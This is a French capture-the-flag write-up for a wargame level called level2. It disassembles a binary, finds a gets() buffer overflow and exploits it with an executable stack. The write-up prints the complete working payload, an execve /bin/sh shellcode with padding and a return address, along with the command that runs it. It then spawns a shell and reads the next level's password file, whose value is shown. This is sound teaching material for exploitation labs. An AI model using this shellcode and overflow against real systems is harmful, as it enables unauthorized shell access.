#	Au level2 on a un programme qui lis sur l'entree standard.

#	Voyons au niveau du code:

$> objdump -d level2
[...]
080484d4 <p>:
 80484d4:	55                   	push   %ebp
 80484d5:	89 e5                	mov    %esp,%ebp
 80484d7:	83 ec 68             	sub    $0x68,%esp
 80484da:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484df:	89 04 24             	mov    %eax,(%esp)
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>	<-- fflush(stdout)
 80484e7:	8d 45 b4             	lea    -0x4c(%ebp),%eax		<--	buff[76]
 80484ea:	89 04 24             	mov    %eax,(%esp)
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>	<--	gets(buff)
 80484f2:	8b 45 04             	mov    0x4(%ebp),%eax		<-- met eip dans eax
 80484f5:	89 45 f4             	mov    %eax,-0xc(%ebp)		<-- puis le garde dans une var
 80484f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
 80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax		<--	res = eip & 0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax		<-- if (res != 0xb0000000) --|
 8048505:	75 20                	jne    8048527 <p+0x53>									 |
 8048507:	b8 20 86 04 08       	mov    $0x8048620,%eax		<-|							 |
 804850c:	8b 55 f4             	mov    -0xc(%ebp),%edx		  |							 |
 804850f:	89 54 24 04          	mov    %edx,0x4(%esp)		  |	printf("(%p)\n", eip);	 |
 8048513:	89 04 24             	mov    %eax,(%esp)			  |							 |
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>	  |	exit(1);				 |
 804851b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)			  |							 |
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>	<-|							 |
 8048527:	8d 45 b4             	lea    -0x4c(%ebp),%eax		<----------------------------|
 804852a:	89 04 24             	mov    %eax,(%esp)
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>	<-- puts(buff)
 8048532:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 8048535:	89 04 24             	mov    %eax,(%esp)
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>	<-- strdup(buff)
 804853d:	c9                   	leave
 804853e:	c3                   	ret							<-- return

0804853f <main>:
 804853f:	55                   	push   %ebp
 8048540:	89 e5                	mov    %esp,%ebp
 8048542:	83 e4 f0             	and    $0xfffffff0,%esp
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave
 804854b:	c3                   	ret
 804854c:	90                   	nop
 804854d:	90                   	nop
 804854e:	90                   	nop
 804854f:	90                   	nop
[...]

#	Il y a deux fonctions interessantes: main et p.

#	Le main va simplement faire appel a p, puis va quitter. 
#	p va fflush stdout puis faire un gets, qui est sensible au buffer overflow. Il va ensuite recuperer l'adresse stockee dans eip. Cette adresse est sauvegardee a l'appel de la fonction afin de permettre a celle ci de jump correctement sur la fonction appelante une fois que p aura return.

#	Il y aura un & binaire suivi d'une comparaison qui, si elle reussie, va printf l'adresse stockee dans eip.

#	Sinon la fonction fera simplement un puts du buff et un stdup de ce meme buff.

#	On sais que gets est vulnerable a un buffer overflow. Mais ici aucune fonction cachee.
#	Cependant il est possible d'utiliser ce buffer et de modifier l'adresse contenue dans eip afin que celle ci soit l'adresse du debut du buffer. Voici un schema:

|-------|
|  EIP	|------> Sauvegarde de eip etant l'adresse de retour apres la fonction p
|-------|
|  EBP  |------> Sauvegarde de ebp
|-------|---|
|		| 	|
|		|	|
|		|	|	
|BUFFER	|	|--> Taille de 76
|		|	|
|		|	|
|		|	|
|-------|---|--> Adresse du debut non connue
| AUTRE	|
|-------|------> esp

#	L'idee est de mettre un shellcode executant un shell dans le buffer, puis de lui ajouter un padding afin d'overflow, de depasser ebp (de taille 4) afin d'atteindre eip et d'y inserer l'adresse du debut du buffer.

#	Cependant pour cela il faut que la stack soit executable, c'est facilement verifiable:

$> readelf -l level2 | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4

#	On peux voir les lettres RWE qui correspondent aux droits sur la stack (Read, Write, Exec)
#	Elle est donc executable, parfait.

#	J'ai donc pris un shellcode:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

#	Il fait une taille de 28, il faudra donc ajouter 48 bytes de padding pour remplir le buffer + 4 pour effacer eip et ensuite ajouter l'adresse du debut du buffer.
#	Pour la connaitre je vais utiliser ltrace et regarder la valeur de retour du strdup:

$> ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                           = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5test
)                = 0xbffff6fc
puts("test"test
)                                                 = 5
strdup("test")                                               = 0x0804a008
+++ exited (status 8) +++

#	Ce qui nous donne ce shellcode:

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\xa0\x04\x08

#	Je l'ai passe sous forme d'une commande plus simple a coller sur la vm:

$> (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 52*'a' + '\x08\xa0\x04\x08'"; cat -) | ./level2
1�Ph//shh/bin����°
                  1�@̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

#	Et voila !!
